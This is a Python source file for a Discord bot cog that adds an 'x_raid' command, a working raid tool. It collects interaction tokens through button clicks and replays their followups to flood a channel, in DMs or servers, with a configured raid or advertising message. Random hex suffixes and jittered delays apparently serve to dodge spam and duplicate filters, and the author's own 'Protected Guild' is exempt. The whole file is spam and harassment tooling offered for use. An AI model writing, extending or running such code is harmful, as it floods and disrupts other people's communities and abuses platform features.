# This cog is experimental and is not ready for production.

import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random

from utils.raid_logger import rlog
from utils.raid_config import RAID_MESSAGE, MAIN_GUILD, SERVER_INVITE
from utils.access_manager import AccessManager
access = AccessManager()

class XRaidView(discord.ui.LayoutView):
    def __init__(self, bot):
        super().__init__(timeout=None)
        self.bot = bot
        self.interaction_webhooks = []
        self.container = discord.ui.Container(
            discord.ui.TextDisplay(
                content="### X Raid"
            ),
            discord.ui.Separator(visible=True, spacing=discord.SeparatorSpacing.small),
            discord.ui.TextDisplay(
                content=(
                    "This command operates entirely as an **External Application**.\n"
                    "It works in both **Direct Messages** and **Servers**.\n\n"
                    "1. Click **'Farm Token'** multiple times (each click is 5 messages).\n"
                    "2. Click **'Execute X Raid'** to flood the channel via interaction tokens."
                ),
            ),
            discord.ui.Separator(visible=True, spacing=discord.SeparatorSpacing.small),
        )
        self.action_row = discord.ui.ActionRow()
        self.button1 = discord.ui.Button(label="Farm Token (0)", style=discord.ButtonStyle.primary, custom_id="add_app_token")
        self.button2 = discord.ui.Button(label="Execute X Raid", style=discord.ButtonStyle.danger, custom_id="launch_x_raid")
        self.action_row.add_item(self.button1)
        self.action_row.add_item(self.button2)
        self.container.add_item(self.action_row)
        self.add_item(self.container)

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        button_id = interaction.data.get("custom_id")
        if button_id == "add_app_token":
            await self.add_token(interaction, self.button1)
        elif button_id == "launch_x_raid":
            await self.launch_raid(interaction, self.button2)
        else:
            await interaction.response.send_message("Unknown button interaction.", ephemeral=True)


    async def add_token(self, interaction: discord.Interaction, button: discord.ui.Button):
        # Farm interaction tokens to determine raid power
        self.interaction_webhooks.append(interaction)
        self.button1.label = f"Farm Token ({len(self.interaction_webhooks)})"
        await interaction.response.edit_message(view=self)

    async def launch_raid(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not self.interaction_webhooks:
            error_view = discord.ui.LayoutView()
            container = discord.ui.Container(
                discord.ui.TextDisplay(
                    content="# ❌️ Error"
                ),
                discord.ui.TextDisplay(
                    content="You must farm at least one token first!"
                )
            )
            error_view.add_item(container)
            await interaction.response.send_message(view=error_view, ephemeral=True)
            return

        await interaction.response.defer(ephemeral=True)

        tokens_count = len(self.interaction_webhooks)
        messages_per_token = 5

        await interaction.followup.send(
            f"Farmed **{tokens_count}** tokens. Launching distributed external raid burst...", 
            ephemeral=True
        )

        tasks = []
        for token_interaction in self.interaction_webhooks:
            tasks.append(self._send_external_burst(token_interaction, messages_per_token))

        await asyncio.gather(*tasks)

        # Reset state
        self.interaction_webhooks = []
        for child in self.children:
            if isinstance(child, discord.ui.Button) and child.custom_id == "add_app_token":
                child.label = "Farm Token (0)"

        try:
            await interaction.edit_original_response(view=self)
        except Exception as e:
            print(f"[x_raid] Failed to update original response: {e}")
            pass

        await interaction.followup.send("External X Raid burst completed.", ephemeral=True)

    async def _send_external_burst(self, interaction: discord.Interaction, count: int):
        for i in range(count):
            try:
                # Use interaction followup tokens to send messages as an external app
                # This works in DMs and Servers
                msg = f"{RAID_MESSAGE} | `{random.getrandbits(32):x}`"
                await interaction.followup.send(msg)
                await asyncio.sleep(random.uniform(0.5, 1.0))
            except Exception:
                break

class XRaid(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="x_raid", description="Experimental external-app raid (Works in DMs and Servers)")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def x_raid(self, interaction: discord.Interaction):
        await rlog(self.bot, "x_raid", interaction.user, interaction.guild_id)
        # Guard check
        guard = await access.guard(interaction, {"action": "advertise", "cooldown_seconds": 60})
        if not guard.get("ok"):
            reason = str(guard.get("reason", "unknown"))
            msg = {
                "not_authorized": f"You are not authorized to use this bot.\n-# Please join the support server and verify to get access to the bot.\n-# {SERVER_INVITE}",
                "global_locked": "Bot is currently locked.",
                "user_blocked": "You are blocked from using this bot.",
                "rate_limited": f"Wait {guard.get('wait')}s."
            }
            view = discord.ui.LayoutView()
            container = discord.ui.Container(
                discord.ui.TextDisplay(
                    content=f"# ❌️ Access Denied\n{msg.get(reason, 'Access denied.')}"
                )
            )
            view.add_item(container)
            await interaction.response.send_message(view=view, ephemeral=True)
            return
        # Guild check
        if interaction.guild:
            if interaction.guild.id == MAIN_GUILD:
                view = discord.ui.LayoutView()
                container = discord.ui.Container(
                    discord.ui.TextDisplay(
                        content="## ❌️ Access Denied"
                    ),
                    discord.ui.TextDisplay(
                        content="You cannot use this command here because this is a **Protected Guild**."
                    ),
                )
                view.add_item(container)
                return await interaction.response.send_message(view=view, ephemeral=True)
        # End of checks

        await interaction.response.send_message(view=XRaidView(self.bot), ephemeral=True)

async def setup(bot):
    await bot.add_cog(XRaid(bot))
